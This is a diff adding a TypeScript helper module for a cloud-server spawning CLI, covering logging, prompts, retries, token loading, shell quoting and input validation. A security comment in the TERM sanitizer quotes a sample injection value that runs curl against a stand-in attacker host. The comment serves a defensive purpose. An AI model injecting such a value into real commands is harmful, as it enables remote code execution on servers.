@@ -1,0 +1,447 @@
+// shared/ui.ts — Logging, prompts, and browser opening
+// @clack/prompts is bundled into cli.js at build time.
+
+import "../unicode-detect.js"; // Must run before @clack/prompts: configures TERM for unicode detection
+
+import { readFileSync } from "node:fs";
+import * as p from "@clack/prompts";
+import { isString } from "@grid-spawn/sdk";
+import { parseJsonObj } from "./parse.js";
+import { getSpawnCloudConfigPath } from "./paths.js";
+import { asyncTryCatch, tryCatch, unwrapOr } from "./result.js";
+import { captureError, captureWarning } from "./telemetry.js";
+
+const RED = "\x1b[0;31m";
+const GREEN = "\x1b[0;32m";
+const YELLOW = "\x1b[1;33m";
+const CYAN = "\x1b[0;36m";
+const DIM = "\x1b[2m";
+const NC = "\x1b[0m";
+
+export function logInfo(msg: string): void {
+  process.stderr.write(`${GREEN}${msg}${NC}\n`);
+}
+
+/** Log a debug message to stderr (dim text). Only visible when SPAWN_DEBUG=1. */
+export function logDebug(msg: string): void {
+  if (process.env.SPAWN_DEBUG === "1") {
+    process.stderr.write(`${DIM}[debug] ${msg}${NC}\n`);
+  }
+}
+
+export function logWarn(msg: string): void {
+  process.stderr.write(`${YELLOW}${msg}${NC}\n`);
+  captureWarning(msg);
+}
+
+export function logError(msg: string): void {
+  process.stderr.write(`${RED}${msg}${NC}\n`);
+  captureError("log_error", msg);
+}
+
+export function logStep(msg: string): void {
+  process.stderr.write(`${CYAN}${msg}${NC}\n`);
+}
+
+/** Overwrite the current line with a status message (no newline). Call logStepDone() when finished.
+ *  Falls back to newline-separated output when stderr is not a TTY (e.g., piped or captured). */
+export function logStepInline(msg: string): void {
+  if (process.stderr.isTTY) {
+    process.stderr.write(`\r${CYAN}${msg}${NC}\x1b[K`);
+  } else {
+    process.stderr.write(`${CYAN}${msg}${NC}\n`);
+  }
+}
+
+/** End an inline status line by moving to the next line. */
+export function logStepDone(): void {
+  if (process.stderr.isTTY) {
+    process.stderr.write("\r\x1b[K");
+  }
+}
+
+/** Prompt for a line of user input. Throws if non-interactive.
+ *  Uses @clack/prompts instead of Node readline to avoid Bun #1707
+ *  where readline interfaces silently close after @clack/prompts runs
+ *  (e.g., SSH key multiselect kills subsequent readline prompts).
+ *  Rejects if stdin closes unexpectedly (e.g., post-clack state corruption)
+ *  instead of hanging forever. */
+export async function prompt(question: string): Promise<string> {
+  if (process.env.SPAWN_NON_INTERACTIVE === "1") {
+    throw new Error("Cannot prompt: SPAWN_NON_INTERACTIVE is set");
+  }
+  // Strip trailing ": " or ":" since clack adds its own formatting
+  const message = question.replace(/:\s*$/, "").trim();
+
+  // Race the prompt against stdin closing unexpectedly.
+  // If stdin dies (e.g., after @clack/prompts corrupts its state),
+  // the close listener rejects so we don't hang forever.
+  let cleanupStdinListener: (() => void) | undefined;
+  const stdinClosePromise = new Promise<never>((_resolve, reject) => {
+    const onClose = () => {
+      reject(new Error("stdin closed unexpectedly during prompt"));
+    };
+    process.stdin.once("close", onClose);
+    cleanupStdinListener = () => {
+      process.stdin.removeListener("close", onClose);
+    };
+  });
+
+  const r = await asyncTryCatch(() =>
+    Promise.race([
+      p.text({
+        message,
+      }),
+      stdinClosePromise,
+    ]),
+  );
+  cleanupStdinListener?.();
+  if (!r.ok) {
+    throw r.error;
+  }
+  if (p.isCancel(r.data)) {
+    process.stderr.write("\n");
+    process.exit(0);
+  }
+  return (r.data || "").trim();
+}
+
+/**
+ * Display an interactive select from pipe-delimited items.
+ * Items format: "id|label" per line.
+ * Uses @clack/prompts when available (local checkout), falls back to numbered list.
+ * Returns the selected id.
+ */
+export async function selectFromList(items: string[], promptText: string, defaultValue: string): Promise<string> {
+  if (items.length === 0) {
+    return defaultValue;
+  }
+
+  const parsed = items.map((line) => {
+    const parts = line.split("|");
+    return {
+      id: parts[0],
+      label: parts.slice(1).join(" — "),
+    };
+  });
+
+  if (parsed.length === 1) {
+    logInfo(`Using ${promptText}: ${parsed[0].id}`);
+    return parsed[0].id;
+  }
+
+  const result = await p.select({
+    message: `Select ${promptText}`,
+    options: parsed.map((item) => ({
+      value: item.id,
+      label: item.id,
+      hint: item.label,
+    })),
+    initialValue: defaultValue,
+  });
+
+  if (p.isCancel(result)) {
+    process.stderr.write("\n");
+    process.exit(0);
+  }
+  return isString(result) ? result : String(result);
+}
+
+/** Open a URL in the user's browser. */
+export function openBrowser(url: string): void {
+  const cmds: [
+    string,
+    string[],
+  ][] =
+    process.platform === "darwin"
+      ? [
+          [
+            "open",
+            [
+              url,
+            ],
+          ],
+        ]
+      : [
+          [
+            "xdg-open",
+            [
+              url,
+            ],
+          ],
+          [
+            "termux-open-url",
+            [
+              url,
+            ],
+          ],
+        ];
+
+  let opened = false;
+  for (const [cmd, args] of cmds) {
+    const r = tryCatch(() =>
+      Bun.spawnSync(
+        [
+          cmd,
+          ...args,
+        ],
+        {
+          stdio: [
+            "ignore",
+            "ignore",
+            "ignore",
+          ],
+        },
+      ),
+    );
+    if (r.ok && r.data.exitCode === 0) {
+      opened = true;
+      break;
+    }
+  }
+
+  // Always show the URL as fallback (headless VMs, VNC, SSH sessions)
+  if (opened) {
+    logStep(`If the browser didn't open, visit: ${url}`);
+  } else {
+    logStep(`Please open: ${url}`);
+  }
+}
+
+// ─── Retry-or-quit ─────────────────────────────────────────────────────
+
+/**
+ * Prompt the user to retry or quit after a failure.
+ * - Enter / "y" / anything else → returns (caller retries)
+ * - "n" / "N" / Ctrl+C (empty) → throws (caller exits)
+ *
+ * In non-interactive mode, always throws immediately.
+ */
+export async function retryOrQuit(message: string): Promise<void> {
+  if (process.env.SPAWN_NON_INTERACTIVE === "1") {
+    throw new Error("Non-interactive mode: cannot retry");
+  }
+  process.stderr.write("\n");
+  const answer = await prompt(`${message} (Y/n): `);
+  if (!answer || /^[Nn]/.test(answer)) {
+    throw new Error("User chose to exit");
+  }
+}
+
+// ─── Result-based retry ────────────────────────────────────────────────
+
+import type { Result } from "./result.js";
+
+export { Err, Ok, type Result } from "./result.js";
+
+/**
+ * Phase-aware retry helper using the Result monad.
+ *
+ * - `fn` returns `Ok(value)` on success — stops retrying, returns `value`.
+ * - `fn` returns `Err(error)` on a retryable failure — retries up to `maxAttempts`.
+ * - `fn` **throws** on a non-retryable failure — immediately propagates (no retry).
+ *
+ * This lets each caller decide at the point of failure whether the error is
+ * retryable (return Err) or fatal (throw), instead of relying on brittle
+ * error-message pattern matching after the fact.
+ */
+export async function withRetry<T>(
+  label: string,
+  fn: () => Promise<Result<T>>,
+  maxAttempts = 3,
+  delaySec = 5,
+  exponential = false,
+): Promise<T> {
+  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
+    const result = await fn(); // throws → not retried (non-retryable)
+    if (result.ok) {
+      return result.data;
+    }
+    if (attempt >= maxAttempts) {
+      throw result.error;
+    }
+    const delay = exponential ? delaySec * 2 ** (attempt - 1) : delaySec;
+    logWarn(`${label} failed (attempt ${attempt}/${maxAttempts}), retrying in ${delay}s...`);
+    await new Promise((r) => setTimeout(r, delay * 1000));
+  }
+  throw new Error("unreachable");
+}
+
+/**
+ * Load an API token from the per-cloud config file.
+ * Reads `api_key` or `token` field and validates allowed characters.
+ * Returns null if the file is missing, unreadable, or the token is invalid.
+ */
+export function loadApiToken(cloud: string): string | null {
+  return unwrapOr(
+    tryCatch(() => {
+      const data = parseJsonObj(readFileSync(getSpawnCloudConfigPath(cloud), "utf-8"));
+      if (!data) {
+        return null;
+      }
+      const token = (isString(data.api_key) ? data.api_key : "") || (isString(data.token) ? data.token : "");
+      if (!token) {
+        return null;
+      }
+      if (!/^[a-zA-Z0-9._/@:+=, -]+$/.test(token)) {
+        return null;
+      }
+      return token;
+    }),
+    null,
+  );
+}
+
+/** POSIX single-quote escaping: wraps `s` in single quotes and escapes any
+ *  embedded single quotes with the standard `'\''` technique.
+ *
+ *  Defense-in-depth: rejects null bytes which could truncate the string at
+ *  the C/OS level even though callers already validate for them. */
+export function shellQuote(s: string): string {
+  if (/\0/.test(s)) {
+    throw new Error("shellQuote: input must not contain null bytes");
+  }
+  return "'" + s.replace(/'/g, "'\\''") + "'";
+}
+
+/** JSON-escape a string (returns the quoted JSON string). */
+export function jsonEscape(s: string): string {
+  return JSON.stringify(s);
+}
+
+/** Validate server name: 3-63 chars, alphanumeric + dash, no leading/trailing dash. */
+export function validateServerName(name: string): boolean {
+  if (name.length < 3 || name.length > 63) {
+    return false;
+  }
+  if (!/^[a-zA-Z0-9-]+$/.test(name)) {
+    return false;
+  }
+  if (name.startsWith("-") || name.endsWith("-")) {
+    return false;
+  }
+  return true;
+}
+
+/** Validate region name: 1-63 chars, alphanumeric + dash + underscore. */
+export function validateRegionName(region: string): boolean {
+  return /^[a-zA-Z0-9_-]{1,63}$/.test(region);
+}
+
+/** Validate model ID: provider/model format, alphanumeric + slash + dash + dot + underscore + colon. */
+export function validateModelId(id: string): boolean {
+  return /^[a-zA-Z0-9][a-zA-Z0-9_.:-]*\/[a-zA-Z0-9][a-zA-Z0-9_.:-]*$/.test(id);
+}
+
+/** Convert display name to kebab-case. */
+export function toKebabCase(name: string): string {
+  return name
+    .toLowerCase()
+    .replace(/[^a-z0-9-]/g, "-")
+    .replace(/-{2,}/g, "-")
+    .replace(/^-|-$/g, "");
+}
+
+/** Generate a default spawn name with random suffix (e.g. "spawn-a1b2"). */
+export function defaultSpawnName(): string {
+  const suffix = Math.random().toString(36).slice(2, 6);
+  return `spawn-${suffix}`;
+}
+
+/**
+ * Get server name from a cloud-specific env var, falling back to SPAWN_NAME_KEBAB / defaultSpawnName.
+ * Every cloud module had an identical copy of this logic — now unified here.
+ */
+export function getServerNameFromEnv(cloudEnvVar: string): string {
+  const cloudName = process.env[cloudEnvVar];
+  if (cloudName) {
+    if (!validateServerName(cloudName)) {
+      logError(`Invalid ${cloudEnvVar}: '${cloudName}'`);
+      throw new Error("Invalid server name");
+    }
+    logInfo(`Using server name from environment: ${cloudName}`);
+    return cloudName;
+  }
+
+  const kebab = process.env.SPAWN_NAME_KEBAB || (process.env.SPAWN_NAME ? toKebabCase(process.env.SPAWN_NAME) : "");
+  return kebab || defaultSpawnName();
+}
+
+/**
+ * Prompt user for a spawn name (or derive it non-interactively).
+ * Every cloud module had an identical copy of this logic — now unified here.
+ *
+ * @param cloudLabel - Display label for the prompt (e.g. "AWS instance", "Hetzner server")
+ */
+export async function promptSpawnNameShared(cloudLabel: string): Promise<void> {
+  if (process.env.SPAWN_NAME_KEBAB) {
+    return;
+  }
+
+  let kebab: string;
+  if (process.env.SPAWN_NON_INTERACTIVE === "1") {
+    kebab = (process.env.SPAWN_NAME ? toKebabCase(process.env.SPAWN_NAME) : "") || defaultSpawnName();
+  } else {
+    const derived = process.env.SPAWN_NAME ? toKebabCase(process.env.SPAWN_NAME) : "";
+    const fallback = derived || defaultSpawnName();
+    process.stderr.write("\n");
+    const answer = await prompt(`${cloudLabel} name [${fallback}]: `);
+    kebab = toKebabCase(answer || fallback) || defaultSpawnName();
+  }
+
+  process.env.SPAWN_NAME_DISPLAY = kebab;
+  process.env.SPAWN_NAME_KEBAB = kebab;
+  logInfo(`Using resource name: ${kebab}`);
+}
+
+/** Known-safe TERM values — defense-in-depth allowlist. */
+const SAFE_TERMS = new Set([
+  "xterm-256color",
+  "xterm",
+  "screen-256color",
+  "screen",
+  "tmux-256color",
+  "tmux",
+  "linux",
+  "vt100",
+  "vt220",
+  "dumb",
+]);
+
+/** Sanitize TERM value before interpolating into shell commands.
+ *  SECURITY: Prevents shell injection via malicious TERM env vars
+ *  (e.g., TERM='$(curl attacker.com)' would execute on the remote server).
+ *  Uses an explicit allowlist of known-safe values instead of a regex. */
+export function sanitizeTermValue(term: string): string {
+  if (SAFE_TERMS.has(term)) {
+    return term;
+  }
+  return "xterm-256color";
+}
+
+/** Prepare stdin for clean handoff to an interactive child process.
+ *  Removes listeners and resets raw mode so fd 0 is clean.
+ *
+ *  NOTE: Do NOT call process.stdin.destroy() here — it can corrupt fd 0
+ *  so the child process (SSH) inherits a broken file descriptor.
+ *  Do NOT call stty sane — it enables ixon (XON/XOFF flow control) which
+ *  SSH may not fully override, causing periodic input pauses.
+ *
+ *  The interactive session uses spawnSync which blocks the event loop,
+ *  so there's no fd 0 competition regardless of stream state. */
+export function prepareStdinForHandoff(): void {
+  // Remove any leftover keypress/data listeners (from @clack/prompts, readline, etc.)
+  process.stdin.removeAllListeners();
+
+  // Reset raw mode so the terminal is in cooked mode before SSH takes over.
+  // SSH will set its own terminal mode when it starts.
+  if (process.stdin.isTTY) {
+    tryCatch(() => process.stdin.setRawMode(false));
+  }
+
+  // Stop the stream from reading, but do NOT destroy it (that can close fd 0).
+  // Do NOT call unref() here — it allows the event loop to exit before an
+  // async child process (spawnBash) finishes. The spawnInteractive path uses
+  // spawnSync so the event loop is already blocked.
+  process.stdin.pause();
+}
